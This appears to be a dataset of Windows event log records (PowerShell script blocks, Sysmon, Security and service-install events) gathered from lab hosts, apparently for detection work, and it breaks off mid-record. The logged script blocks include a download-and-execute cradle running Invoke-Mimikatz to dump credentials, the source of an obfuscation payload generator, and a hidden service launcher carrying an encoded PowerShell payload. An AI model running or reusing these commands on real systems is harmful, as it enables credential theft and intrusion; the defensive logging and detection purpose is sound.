  "100018": {
    "event_id": 4104,
    "channel": "Microsoft-Windows-PowerShell/Operational",
    "provider_name": "Microsoft-Windows-PowerShell",
    "computer": "FS03.offsec.lan",
    "timestamp": "2021-10-25T07:23:05.614172Z",
    "event_data": {
      "ScriptBlockText": "@{\r\nGUID=\"1DA87E53-152B-403E-98DC-74D7B4D63D59\"\r\nAuthor=\"Microsoft Corporation\"\r\nCompanyName=\"Microsoft Corporation\"\r\nCopyright=\"\u00a9 Microsoft Corporation. All rights reserved.\"\r\nModuleVersion=\"3.1.0.0\"\r\nPowerShellVersion=\"3.0\"\r\nCLRVersion=\"4.0\"\r\nCmdletsToExport= \"Format-List\", \"Format-Custom\", \"Format-Table\", \"Format-Wide\",\r\n    \"Out-File\", \"Out-Printer\", \"Out-String\",\r\n    \"Out-GridView\", \"Get-FormatData\", \"Export-FormatData\", \"ConvertFrom-Json\", \"ConvertTo-Json\",\r\n    \"Invoke-RestMethod\", \"Invoke-WebRequest\", \"Register-ObjectEvent\", \"Register-EngineEvent\",\r\n    \"Wait-Event\", \"Get-Event\", \"Remove-Event\", \"Get-EventSubscriber\", \"Unregister-Event\",\r\n    \"New-Event\", \"Add-Member\", \"Add-Type\", \"Compare-Object\", \"ConvertTo-Html\", \"ConvertFrom-StringData\",\r\n    \"Export-Csv\", \"Import-Csv\", \"ConvertTo-Csv\", \"ConvertFrom-Csv\", \"Export-Alias\", \"Invoke-Expression\",\r\n    \"Get-Alias\", \"Get-Culture\", \"Get-Date\", \"Get-Host\", \"Get-Member\", \"Get-Random\", \"Get-UICulture\",\r\n    \"Get-FileHash\", \"Get-Unique\", \"Export-PSSession\", \"Import-PSSession\", \"Import-Alias\", \"Import-LocalizedData\",\r\n    \"Select-String\", \"Measure-Object\", \"New-Alias\", \"New-TimeSpan\", \"Read-Host\", \"Set-Alias\", \"Set-Date\",\r\n    \"Start-Sleep\", \"Tee-Object\", \"Measure-Command\", \"Update-List\", \"Update-TypeData\", \"Update-FormatData\",\r\n    \"Remove-TypeData\", \"Get-TypeData\", \"Write-Host\", \"Write-Progress\", \"New-Object\", \"Select-Object\",\r\n    \"Group-Object\", \"Sort-Object\", \"Get-Variable\", \"New-Variable\", \"Set-Variable\", \"Remove-Variable\",\r\n    \"Clear-Variable\", \"Export-Clixml\", \"Import-Clixml\", \"ConvertTo-Xml\", \"Select-Xml\", \"Write-Debug\",\r\n    \"Write-Verbose\", \"Write-Warning\", \"Write-Error\", \"Write-Output\", \"Set-PSBreakpoint\", \"Get-PSBreakpoint\",\r\n    \"Remove-PSBreakpoint\", \"Enable-PSBreakpoint\", \"Disable-PSBreakpoint\", \"Get-PSCallStack\",\r\n    \"Send-MailMessage\", \"Get-TraceSource\", \"Set-TraceSource\", \"Trace-Command\", \"Show-Command\", \"Unblock-File\"\r\nNestedModules=\"Microsoft.PowerShell.Commands.Utility.dll\",\"Microsoft.PowerShell.Utility.psm1\"\r\nHelpInfoURI = 'http://go.microsoft.com/fwlink/?linkid=285758'\r\n}\r\n"
    }
  },
  "112039": {
    "event_id": 12,
    "channel": "Microsoft-Windows-Sysmon/Operational",
    "provider_name": "Microsoft-Windows-Sysmon",
    "computer": "WORKSTATION7.theshire.local",
    "timestamp": "2020-10-22 04:29:56",
    "event_data": {
      "TargetObject": "HKU\\S-1-5-21-2323213074-4052461197-1785501644-1104\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders"
    }
  },
  "104507": {
    "event_id": 4731,
    "channel": "Security",
    "provider_name": "Microsoft-Windows-Security-Auditing",
    "computer": "37L4247F27-25",
    "timestamp": "2017-12-13T14:48:10.480438Z",
    "event_data": {}
  },
  "104508": {
    "event_id": 4735,
    "channel": "Security",
    "provider_name": "Microsoft-Windows-Security-Auditing",
    "computer": "37L4247F27-25",
    "timestamp": "2017-12-13T14:48:10.480438Z",
    "event_data": {}
  },
  "108522": {
    "event_id": 4104,
    "channel": "Microsoft-Windows-PowerShell/Operational",
    "provider_name": "Microsoft-Windows-PowerShell",
    "computer": "SEC511",
    "timestamp": "2017-08-30T16:31:57.382827Z",
    "event_data": {
      "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
    }
  },
  "112040": {
    "event_id": 4104,
    "channel": "Microsoft-Windows-PowerShell/Operational",
    "provider_name": "Microsoft-Windows-PowerShell",
    "computer": "SEC511",
    "timestamp": "2017-08-30T16:32:13.804037Z",
    "event_data": {
      "ScriptBlockText": "function Check-Obfu($string){\r\n    # Check how many special characters are in the command. Inspired by Invoke-Obfuscation: https://twitter.com/danielhbohannon/status/778268820242825216\r\n    # There are many ways to do this, including regex. Need a way that doesn't kill the CPU. This works, but isn't super concise. There is probably a\r\n    # better way.\r\n    # \r\n    $obfutext=\"\" # Local variable for return output\r\n    $maxchars=25\r\n    #$obfuchars = \"\\+\", \"\\'\", \"\\}\", \"\\{\"\r\n    #foreach ($char in $obfuchars){\r\n    #\r\n    # I tried to loop through the characters (as the two commented lines above show, but\r\n    # hit problems of variable interpolation. I am probably making a simple mistake.\r\n    # If you can get the above loop working, please email deepblue at backshore dot net. \r\n    # I will repay in an adult beverage \r\n    #\r\n    # In the meantime, this is ugly, but works\r\n    $string2 = $string -replace \"`'\"\r\n    # Compare the length\r\n    if (($string.length - $string2.length) -gt $maxchars){\r\n        $obfutext += \"   - Possible command obfuscation: greater than $maxchars ' characters`n\"\r\n    }\r\n    $string2 = $string -replace \"`{\"\r\n    if (($string.length - $string2.length) -gt $maxchars){\r\n        $obfutext += \"   - Possible command obfuscation: greater than $maxchars { characters`n\"\r\n    }\r\n    $string2 = $string -replace \"`}\"\r\n    if (($string.length - $string2.length) -gt $maxchars){\r\n        $obfutext += \"   - Possible command obfuscation: greater than $maxchars } characters`n\"\r\n    }\r\n    $string2 = $string -replace \",\"\r\n    if (($string.length - $string2.length) -gt $maxchars){\r\n        $obfutext += \"   - Possible command obfuscation: greater than $maxchars , characters`n\"\r\n    }\r\n    $string2 = $string -replace \"`\"\"\r\n    if (($string.length - $string2.length) -gt $maxchars){\r\n        $obfutext += \"   - Possible command obfuscation: greater than $maxchars double quotes`n\"\r\n    }\r\n    return $obfutext\r\n    #}\r\n}"
    }
  },
  "100019": {
    "event_id": 4104,
    "channel": "Microsoft-Windows-PowerShell/Operational",
    "provider_name": "Microsoft-Windows-PowerShell",
    "computer": "SEC511",
    "timestamp": "2017-08-30T18:15:55.285682Z",
    "event_data": {
      "ScriptBlockText": "#   This file is part of Invoke-Obfuscation.\r\n#\r\n#   Copyright 2017 Daniel Bohannon <@danielhbohannon>\r\n#         while at Mandiant <http://www.mandiant.com>\r\n#\r\n#   Licensed under the Apache License, Version 2.0 (the \"License\");\r\n#   you may not use this file except in compliance with the License.\r\n#   You may obtain a copy of the License at\r\n#\r\n#       http://www.apache.org/licenses/LICENSE-2.0\r\n#\r\n#   Unless required by applicable law or agreed to in writing, software\r\n#   distributed under the License is distributed on an \"AS IS\" BASIS,\r\n#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\r\n#   See the License for the specific language governing permissions and\r\n#   limitations under the License.\r\n\r\n\r\n\r\nFunction Out-EncodedWhitespaceCommand\r\n{\r\n<#\r\n.SYNOPSIS\r\n\r\nGenerates Whitespace encoded payload for a PowerShell command or script. Optionally it adds command line output to final command.\r\n\r\nInvoke-Obfuscation Function: Out-EncodedWhitespaceCommand\r\nAuthor: Daniel Bohannon (@danielhbohannon)\r\nLicense: Apache License, Version 2.0\r\nRequired Dependencies: None\r\nOptional Dependencies: None\r\n \r\n.DESCRIPTION\r\n\r\nOut-EncodedWhitespaceCommand encodes an input PowerShell scriptblock or path as a Whitespace-and-Tab encoded payload. The purpose is to highlight to the Blue Team that there are more novel ways to encode a PowerShell command other than the most common Base64 approach.\r\n\r\n.PARAMETER ScriptBlock\r\n\r\nSpecifies a scriptblock containing your payload.\r\n\r\n.PARAMETER Path\r\n\r\nSpecifies the path to your payload.\r\n\r\n.PARAMETER NoExit\r\n\r\nOutputs the option to not exit after running startup commands.\r\n\r\n.PARAMETER NoProfile\r\n\r\nOutputs the option to not load the Windows PowerShell profile.\r\n\r\n.PARAMETER NonInteractive\r\n\r\nOutputs the option to not present an interactive prompt to the user.\r\n\r\n.PARAMETER NoLogo\r\n\r\nOutputs the option to not present the logo to the user.\r\n\r\n.PARAMETER Wow64\r\n\r\nCalls the x86 (Wow64) version of PowerShell on x86_64 Windows installations.\r\n\r\n.PARAMETER Command\r\n\r\nOutputs the option to execute the specified commands (and any parameters) as though they were typed at the Windows PowerShell command prompt.\r\n\r\n.PARAMETER WindowStyle\r\n\r\nOutputs the option to set the window style to Normal, Minimized, Maximized or Hidden.\r\n\r\n.PARAMETER ExecutionPolicy\r\n\r\nOutputs the option to set the default execution policy for the current session.\r\n\r\n.PARAMETER PassThru\r\n\r\n(Optional) Avoids applying final command line syntax if you want to apply more obfuscation functions (or a different launcher function) to the final output.\r\n\r\n.EXAMPLE\r\n\r\nC:\\PS> Out-EncodedWhitespaceCommand -ScriptBlock {Write-Host 'Hello World!' -ForegroundColor Green; Write-Host 'Obfuscation Rocks!' -ForegroundColor Green} -NoProfile -NonInteractive\r\n\r\npowershell  -NoP  -NonInterac     \"'         \t        \t\t  \t  \t     \t\t  \t \t      \t\t  \t  \t       \t\t  \t \t  \t\t     \t      \t\t        \t   \t\t  \t  \t  \t\t  \t  \t      \t\t  \t  \t       \t\t    \t   \t\t    \t          \t\t        \t   \t\t  \t \t  \t\t  \t \t         \t\t  \t \t         \t\t  \t  \t  \t\t    \t   \t\t         \t        \t\t  \t  \t  \t\t  \t  \t     \t\t  \t \t         \t\t  \t \t \t\t    \t    \t\t    \t          \t\t    \t   \t\t     \t      \t\t        \t \t\t  \t  \t  \t\t  \t  \t     \t\t  \t \t  \t\t  \t \t    \t\t  \t  \t     \t\t  \t  \t  \t\t  \t  \t        \t\t  \t  \t \t\t  \t \t \t\t       \t        \t\t  \t  \t  \t\t  \t \t         \t\t  \t  \t  \t\t  \t  \t     \t\t    \t   \t\t        \t  \t\t  \t  \t     \t\t  \t \t  \t\t  \t \t  \t\t  \t  \t \t\t      \t          \t\t    \t   \t\t         \t        \t\t  \t  \t     \t\t  \t \t      \t\t  \t  \t       \t\t  \t \t  \t\t     \t      \t\t        \t   \t\t  \t  \t  \t\t  \t  \t      \t\t  \t  \t       \t\t    \t   \t\t    \t          \t\t        \t          \t\t          \t         \t\t  \t \t   \t\t  \t  \t        \t\t  \t  \t      \t\t          \t          \t\t          \t        \t\t  \t  \t       \t\t  \t \t      \t\t  \t  \t  \t\t  \t  \t \t\t    \t   \t\t         \t   \t\t  \t  \t  \t\t          \t          \t\t  \t \t        \t\t  \t  \t      \t\t    \t    \t\t    \t          \t\t    \t   \t\t     \t      \t\t        \t \t\t  \t  \t  \t\t  \t  \t     \t\t  \t \t  \t\t  \t \t    \t\t  \t  \t     \t\t  \t  \t  \t\t  \t  \t        \t\t  \t  \t \t\t  \t \t \t\t       \t        \t\t  \t  \t  \t\t  \t \t         \t\t  \t  \t  \t\t  \t  \t     \t\t    \t   \t\t        \t  \t\t  \t  \t     \t\t  \t \t  \t\t  \t \t  \t\t  \t  \t '|%{$uXOrcSp= $_ -CSplIt '\t\t' | %{'\t' ; $_ -CSplIt '\t' |% { $_.lEngth- 1}} ; .( ([string]''.LAstINDEXOFANy)[92,95,96]-join'')( (($uXOrcSp[0..($uXOrcSp.lEngth-1)] -join'' ).TrIm( '\t ').SPLIT('\t' ) |% {([chAr][iNt]$_) })-join '' ) }\"\r\n\r\nC:\\PS> Out-EncodedWhitespaceCommand -ScriptBlock {Write-Host 'Hello World!' -ForegroundColor Green; Write-Host 'Obfuscation Rocks!' -ForegroundColor Green} -NoProfile -NonInteractive -PassThru\r\n\r\n'\t\t\t\t\t\t\t\t\t \t\t\t\t\t\t\t\t  \t\t \t\t \t\t\t\t\t  \t\t \t \t\t\t\t\t\t  \t\t \t\t \t\t\t\t\t\t\t  \t\t \t \t\t  \t\t\t\t\t \t\t\t\t\t\t  \t\t\t\t\t\t\t\t \t\t\t  \t\t \t\t \t\t  \t\t \t\t \t\t\t\t\t\t  \t\t \t\t \t\t\t\t\t\t\t  \t\t\t\t \t\t\t  \t\t\t\t \t\t\t\t\t\t\t\t\t\t  \t\t\t\t\t\t\t\t \t\t\t  \t\t \t \t\t  \t\t \t \t\t\t\t\t\t\t\t\t  \t\t \t \t\t\t\t\t\t\t\t\t  \t\t \t\t \t\t  \t\t\t\t \t\t\t  \t\t\t\t\t\t\t\t\t \t\t\t\t\t\t\t\t  \t\t \t\t \t\t  \t\t \t\t \t\t\t\t\t  \t\t \t \t\t\t\t\t\t\t\t\t  \t\t \t \t  \t\t\t\t \t\t\t\t  \t\t\t\t \t\t\t\t\t\t\t\t\t\t  \t\t\t\t \t\t\t  \t\t\t\t\t \t\t\t\t\t\t  \t\t\t\t\t\t\t\t \t  \t\t \t\t \t\t  \t\t \t\t \t\t\t\t\t  \t\t \t \t\t  \t\t \t \t\t\t\t  \t\t \t\t \t\t\t\t\t  \t\t \t\t \t\t  \t\t \t\t \t\t\t\t\t\t\t\t  \t\t \t\t \t  \t\t \t \t  \t\t\t\t\t\t\t \t\t\t\t\t\t\t\t  \t\t \t\t \t\t  \t\t \t \t\t\t\t\t\t\t\t\t  \t\t \t\t \t\t  \t\t \t\t \t\t\t\t\t  \t\t\t\t \t\t\t  \t\t\t\t\t\t\t\t \t\t  \t\t \t\t \t\t\t\t\t  \t\t \t \t\t  \t\t \t \t\t  \t\t \t\t \t  \t\t\t\t\t\t \t\t\t\t\t\t\t\t\t\t  \t\t\t\t \t\t\t  \t\t\t\t\t\t\t\t\t \t\t\t\t\t\t\t\t  \t\t \t\t \t\t\t\t\t  \t\t \t \t\t\t\t\t\t  \t\t \t\t \t\t\t\t\t\t\t  \t\t \t \t\t  \t\t\t\t\t \t\t\t\t\t\t  \t\t\t\t\t\t\t\t \t\t\t  \t\t \t\t \t\t  \t\t \t\t \t\t\t\t\t\t  \t\t \t\t \t\t\t\t\t\t\t  \t\t\t\t \t\t\t  \t\t\t\t \t\t\t\t\t\t\t\t\t\t  \t\t\t\t\t\t\t\t \t\t\t\t\t\t\t\t\t\t  \t\t\t\t\t\t\t\t\t\t \t\t\t\t\t\t\t\t\t  \t\t \t \t\t\t  \t\t \t\t \t\t\t\t\t\t\t\t  \t\t \t\t \t\t\t\t\t\t  \t\t\t\t\t\t\t\t\t\t \t\t\t\t\t\t\t\t\t\t  \t\t\t\t\t\t\t\t\t\t \t\t\t\t\t\t\t\t  \t\t \t\t \t\t\t\t\t\t\t  \t\t \t \t\t\t\t\t\t  \t\t \t\t \t\t  \t\t \t\t \t  \t\t\t\t \t\t\t  \t\t\t\t\t\t\t\t\t \t\t\t  \t\t \t\t \t\t  \t\t\t\t\t\t\t\t\t\t \t\t\t\t\t\t\t\t\t\t  \t\t \t \t\t\t\t\t\t\t\t  \t\t \t\t \t\t\t\t\t\t  \t\t\t\t \t\t\t\t  \t\t\t\t \t\t\t\t\t\t\t\t\t\t  \t\t\t\t \t\t\t  \t\t\t\t\t \t\t\t\t\t\t  \t\t\t\t\t\t\t\t \t  \t\t \t\t \t\t  \t\t \t\t \t\t\t\t\t  \t\t \t \t\t  \t\t \t \t\t\t\t  \t\t \t\t \t\t\t\t\t  \t\t \t\t \t\t  \t\t \t\t \t\t\t\t\t\t\t\t  \t\t \t\t \t  \t\t \t \t  \t\t\t\t\t\t\t \t\t\t\t\t\t\t\t  \t\t \t\t \t\t  \t\t \t \t\t\t\t\t\t\t\t\t  \t\t \t\t \t\t  \t\t \t\t \t\t\t\t\t  \t\t\t\t \t\t\t  \t\t\t\t\t\t\t\t \t\t  \t\t \t\t \t\t\t\t\t  \t\t \t \t\t  \t\t \t \t\t  \t\t \t\t \t'| % {$gyPrfqv= $_ -csPLiT '  '|% { ' ';$_.SPlIT(' ') | %{$_.LEngth - 1 }}; [StRINg]::joIn( '',((-jOin ($gyPrfqv[0..($gyPrfqv.LEngth-1)])).triM( '  ' ).SPlIT(' ' )|% { ( [CHAr][iNt]$_)}))|&( $eNv:CoMSPEC[4,26,25]-jOiN'')}\r\n\r\n.NOTES\r\n\r\nInspiration for this encoding technique came from Casey Smith (@subTee) while at the 2017 BlueHat IL conference.\r\nThis is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.\r\n\r\n.LINK\r\n\r\nhttp://www.danielbohannon.com\r\n#>\r\n\r\n    [CmdletBinding(DefaultParameterSetName = 'FilePath')] Param (\r\n        [Parameter(Position = 0, ValueFromPipeline = $True, ParameterSetName = 'ScriptBlock')]\r\n        [ValidateNotNullOrEmpty()]\r\n        [ScriptBlock]\r\n        $ScriptBlock,\r\n\r\n        [Parameter(Position = 0, ParameterSetName = 'FilePath')]\r\n        [ValidateNotNullOrEmpty()]\r\n        [String]\r\n        $Path,\r\n\r\n        [Switch]\r\n        $NoExit,\r\n\r\n        [Switch]\r\n        $NoProfile,\r\n\r\n        [Switch]\r\n        $NonInteractive,\r\n\r\n        [Switch]\r\n        $NoLogo,\r\n\r\n        [Switch]\r\n        $Wow64,\r\n        \r\n        [Switch]\r\n        $Command,\r\n\r\n        [ValidateSet('Normal', 'Minimized', 'Maximized', 'Hidden')]\r\n        [String]\r\n        $WindowStyle,\r\n\r\n        [ValidateSet('Bypass', 'Unrestricted', 'RemoteSigned', 'AllSigned', 'Restricted')]\r\n        [String]\r\n        $ExecutionPolicy,\r\n        \r\n        [Switch]\r\n        $PassThru\r\n    )\r\n    \r\n    # Either convert ScriptBlock to a String or convert script at $Path to a String.\r\n    If($PSBoundParameters['Path'])\r\n    {\r\n        Get-ChildItem $Path -ErrorAction Stop | Out-Null\r\n        $ScriptString = [IO.File]::ReadAllText((Resolve-Path $Path))\r\n    }\r\n    Else\r\n    {\r\n        $ScriptString = [String]$ScriptBlock\r\n    }\r\n    \r\n    # Convert $ScriptString to an ASCII-encoded array.\r\n    $AsciiArray = [Int[]][Char[]]$ScriptString\r\n    \r\n    # Encode ASCII array with defined EncodingChar and DelimiterChar (randomly-selected as whitespace and tab, [Char]9).\r\n    $RandomIndex  = Get-Random -Input @(0,1)\r\n    $EncodedArray = @()\r\n    $EncodingChar       = @(' ',[Char]9)[$RandomIndex]\r\n    $DigitDelimiterChar = @([Char]9,' ')[$RandomIndex]\r\n   \r\n    # Enumerate each ASCII value and (ultimately) store decoded ASCII values in $EncodedArray array.\r\n    ForEach($AsciiValue in $AsciiArray)\r\n    {\r\n        $EncodedAsciiValueArray = @()\r\n        # Enumerate each digit in current ASCII value and convert it to DelimiterChar*Digit.\r\n        ForEach($Digit in [Char[]][String]$AsciiValue)\r\n        {\r\n            $EncodedAsciiValueArray += [String]$EncodingChar*([Int][String]$Digit + 1)\r\n        }\r\n        $EncodedArray += ($EncodedAsciiValueArray -Join $DigitDelimiterChar)\r\n    }\r\n\r\n    # Set $IntDelimiterChar to be two instances of $DigitDelimiterChar.\r\n    # $IntDelimiterChar will essentially be like the comma in the original ASCII array.\r\n    $IntDelimiterChar = $DigitDelimiterChar + $DigitDelimiterChar\r\n\r\n    # Join together final $EncodedString with delimiter selected above.\r\n    $EncodedString = ($EncodedArray -Join $IntDelimiterChar)\r\n    \r\n    # Generate random case versions for necessary operations.\r\n    $ForEachObject = Get-Random -Input @('ForEach','ForEach-Object','%')\r\n    $SplitMethod   = Get-Random -Input @('-Split','-CSplit','-ISplit')\r\n    $Trim          = Get-Random -Input @('Trim','TrimStart')\r\n    $StrJoin       = ([Char[]]'[String]::Join'      | ForEach-Object {$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}) -Join ''\r\n    $StrStr        = ([Char[]]'[String]'            | ForEach-Object {$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}) -Join ''\r\n    $Join          = ([Char[]]'-Join'               | ForEach-Object {$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}) -Join ''\r\n    $CharStr       = ([Char[]]'Char'                | ForEach-Object {$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}) -Join ''\r\n    $Int           = ([Char[]]'Int'                 | ForEach-Object {$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}) -Join ''\r\n    $Length        = ([Char[]]'Length'              | ForEach-Object {$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}) -Join ''\r\n    $ForEachObject = ([Char[]]$ForEachObject        | ForEach-Object {$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}) -Join ''\r\n    $SplitMethod   = ([Char[]]$SplitMethod          | ForEach-Object {$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}) -Join ''\r\n    $SplitMethod2  = ([Char[]]'Split'               | ForEach-Object {$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}) -Join ''\r\n    $Trim          = ([Char[]]$Trim                 | ForEach-Object {$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}) -Join ''\r\n    $SplitOnDelim  = Get-Random -Input @(\" $SplitMethod '$DigitDelimiterChar'\",\".$SplitMethod2('$DigitDelimiterChar')\")\r\n\r\n    # Generate random variable name to store the script's intermediate state while being reassembled.\r\n    $RandomScriptVar = (Get-Random -Input @('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z') -Count (Get-Random -Input @(5..8)) | ForEach-Object {$UpperLowerChar = $_; If(Get-Random -Input @(0..1)) {$UpperLowerChar = $UpperLowerChar.ToUpper()} $UpperLowerChar}) -Join ''\r\n    \r\n    # Build the first part of the decoding routine.\r\n    $ScriptStringPart1 = \"'$EncodedString'\" + ' '*(Get-Random -Input @(0,1)) + '|' + ' '*(Get-Random -Input @(0,1)) + $ForEachObject + ' '*(Get-Random -Input @(0,1)) + '{' + ' '*(Get-Random -Input @(0,1)) + \"`$$RandomScriptVar\" + ' '*(Get-Random -Input @(0,1)) + '=' + ' '*(Get-Random -Input @(0,1)) + \"`$_ $SplitMethod '$IntDelimiterChar'\" + ' '*(Get-Random -Input @(0,1)) + '|' + ' '*(Get-Random -Input @(0,1)) + $ForEachObject + ' '*(Get-Random -Input @(0,1)) + '{' + ' '*(Get-Random -Input @(0,1)) + \"'$DigitDelimiterChar'\" + ' '*(Get-Random -Input @(0,1)) + ';' + ' '*(Get-Random -Input @(0,1)) + \"`$_$SplitOnDelim\" + ' '*(Get-Random -Input @(0,1)) + '|' + ' '*(Get-Random -Input @(0,1)) + $ForEachObject + ' '*(Get-Random -Input @(0,1)) + '{' + ' '*(Get-Random -Input @(0,1)) + \"`$_.$Length\" + ' '*(Get-Random -Input @(0,1)) + '-' + ' '*(Get-Random -Input @(0,1)) + '1' + ' '*(Get-Random -Input @(0,1)) + '}' + ' '*(Get-Random -Input @(0,1)) + '}' + ' '*(Get-Random -Input @(0,1)) + ';'\r\n    \r\n    # Randomly select between various conversion syntax options.\r\n    $RandomStringSyntax = ([Char[]](Get-Random -Input @('[String]$_','$_.ToString()')) | ForEach-Object {$Char = $_.ToString().ToLower(); If(Get-Random -Input @(0..1)) {$Char = $Char.ToUpper()} $Char}) -Join ''\r\n    $RandomConversionSyntax  = @()\r\n    $RandomConversionSyntax += \"[$CharStr]\" + ' '*(Get-Random -Input @(0,1)) + \"[$Int]\" + ' '*(Get-Random -Input @(0,1)) + \"`$_\"\r\n    $RandomConversionSyntax += \"[$Int]\" + ' '*(Get-Random -Input @(0,1)) + \"`$_\" + ' '*"
    }
  },
  "104509": {
    "event_id": 7045,
    "channel": "System",
    "provider_name": "Service Control Manager",
    "computer": "IE10Win7",
    "timestamp": "2016-08-18T20:03:18.175898Z",
    "event_data": {
      "ServiceName": "yagfag",
      "ImagePath": "cmd.exe /c echo yagfag > \\\\.\\pipe\\yagfag"
    }
  },
  "104510": {
    "event_id": 7045,
    "channel": "System",
    "provider_name": "Service Control Manager",
    "computer": "IE10Win7",
    "timestamp": "2016-08-18T20:40:21.230585Z",
    "event_data": {
      "ServiceName": "SYyGmEHvgHiGYApk",
      "ImagePath": "%COMSPEC% /b /c start /b /min powershell.exe -nop -w hidden -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIADQdtlcCA7VWa2/aSBT93Er9D1aFZFslGAhtmkiVdszLhEcA82ZRNdhjM2TsIfY4PLr973sNdkK3zSpdaS2Q53HvzJlzz51rJ/ItQbkv7a3lQPr27u2bLg6wJykZ52s1K2UeREl98waGM65/27wla3PApC+SMkebTYV7mPqLm5tyFATEF6d+rk4ECkPiLRkloaJKf0njFQnIxd1yTSwhfZMyX3N1xpeYJWb7MrZWRLpAvh3PtbiFY0g5c8OoUOQ//5TV+UVhkas+RJiFimzuQ0G8nM2YrErf1XjDwX5DFLlNrYCH3BG5MfUvi7mhH2KHdGC1R9ImYsXtUFbhLPALiIgCXzo7VbzMyUiRodkNuIVsOyAh+OQa/iO/J0rGjxjLSn8o8wRDP/IF9QjMCxLwjUmCR2qRMGdg32akT5yF0iHb9OivdVLOncCqKwI1CyF5EWyb2xEjJ39Z/RluHEwVniSgwMH3d2/fvXXS4K8HpD3c4fP4Q+vN/NgmgFLp8pAeTb9I+azUhp2w4MEeuplBEBF1Ic3jGMwXCykTcee6M9GzLy9RSO3Bmn7UYWQ+4tRegEcSn4zX/WrcGUPK67NCPP+y3irEoT6p7H3sUSuVlPIr3onDyPHAudSsA9gUOZkgdoUw4mIRc5iV5j+7VT0qnnz1iDKbBMiC2IWACsKq/gjmFBZFbvht4gFbp74MUXBAyCS1TsS7T3eP+2AklxkOw6zUjSCTrKxkEsyInZWQH9JkCkWCH5vyM9x2xAS1cCjS5RbqP/lM9i1zPxRBZEEggYOBuSEWxSymJCsZ1Cb63qRuur/8S0LKmDHqu7DSIwQERmIiTBHLIwCoqRTUnElEw9sw4oHZMbtrDLuQy0kuHCWFXWLLL4FN1X6SdkxPyssZVIi5ybjISiMaCLgsYqpBX/8ZyNlF8QOkckCSOClpLs31vYjln9mutlbHEK1YtAlhR3oCAdTUAu7pOCSfSqYIgDjlvXZHywieacNnbUu/pwW0pYVGG/5DetnglSu7ebs2tKCyWzmoETbaRrfSM4zS4605Kgmz2hDNbkO0q5P12kRGfzgVswYyBjR/Py0dNrf0YLaQPd1pnw76YZvXd4e1azvTiuO4V47ZL3ys0da43NPzRdyqVKPWWN/q+VJYpVujR4e9+9uaWE5HDA8dzZ0UrjHdtYL1qMDbhwZC9dWldbh1RvVV295PDe16XLpHVYTKfnVU03lzqgeoq42wO+Lb5rrOxm4Z6TWLkllvWNN7vZqOhvX1Q+Vac8F3glf6eFSks82kv4J+DSA0tXypYZMDn/aApDpH2O2DjVsuWisHbCofkP6hw8Mivtc50sGmNnsAXNNNrctgfjAscjRinQlGrdm+pmmFabeEjDwd110UL4ldvYdR+Fg5VLTCyOb2+GNn6mijCbvSKuXBxnI0TdsalaY1K+w+312V9PxD2aMeWxZt7Xr4Wfe3Tbf76Nq98VV/19kvYb+hpo3ex/oBAWWW1+tJy/3kn+nhpQLQxkG4wgx0And6mr41HtSSe7rLaeyhKMdifU8CnzAoc1AIU8EjxrgV14r0RodSdSogC8jfITQvi79sqdKTofpcQNKhm5sZAIU0SsWdaxHfFatsfneZz0NByO9KeTjw6w9Y5pu98rRcNi4qT0yd78OO+6hxhmUObPbZ6+/+XyKT1F7By34Fkc9j/zL7KnLz2WcCfpr6ceC3mP5tBsaYCrA04Xpi5FRBXyQiEc/ZJ0cSJFCGkzzxF+BdJC468DHyN6LCQgBvCgAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;$s.WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"
    }
  },
  "104511": {
    "event_id": 7045,
    "channel": "System",
    "provider_name": "Service Control Manager",
    "computer": "IE10Win7",
    "timestamp": "2016-09-19T20:36:09.147421Z",
    "event_data": {
      "ServiceName": "zIGuwymOgHZnXZPm",
